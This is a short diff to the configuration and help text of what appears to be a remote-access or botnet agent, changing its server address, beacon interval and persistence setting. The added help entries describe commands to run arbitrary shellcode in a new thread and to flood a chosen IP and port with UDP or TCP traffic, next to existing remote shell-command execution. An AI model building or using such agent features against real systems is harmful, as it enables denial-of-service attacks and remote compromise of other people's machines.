@@ -1,8 +1,9 @@
-SERVER = "http://localhost:8080"
-HELLO_INTERVAL = 2
+SERVER = "http://localhost:5000"
+HELLO_INTERVAL = 1
 IDLE_TIME = 60
-MAX_FAILED_CONNECTIONS = 10
-PERSIST = True
+MAX_FAILED_CONNECTIONS = 100
+PERSIST = False
+TLS_VERIFY = True
 HELP = """
 <any shell command>
 Executes the command in a shell and return its output.
@@ -27,6 +28,15 @@ Installs the agent.
 
 clean
 Uninstalls the agent.
+
+execshellcode <shellcode>
+Executes shellcode in a new thread.
+
+udpflood <ip> <port> <duration>
+Floods the target with random UDP packets.
+
+tcpflood <ip> <port> <duration>
+Floods the target with several TCP connections.
 
 exit
 Kills the agent.
